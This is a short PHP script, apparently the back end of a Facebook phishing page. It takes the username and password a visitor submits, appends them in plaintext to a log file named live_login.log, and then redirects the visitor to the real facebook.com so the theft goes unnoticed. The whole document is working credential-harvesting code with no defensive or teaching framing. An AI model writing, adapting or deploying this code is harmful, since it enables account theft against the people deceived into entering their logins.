<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $entry = "Username: " . $username . " | Password: " . $password . "\n";

    // Log file in project directory
    $liveLog = "live_login.log";

    // Save entry to live_login.log
    file_put_contents($liveLog, date("Y-m-d H:i:s") . " - " . $entry, FILE_APPEND);

    // Redirect user to Facebook
    header("Location: https://www.facebook.com");
    exit();
}
?>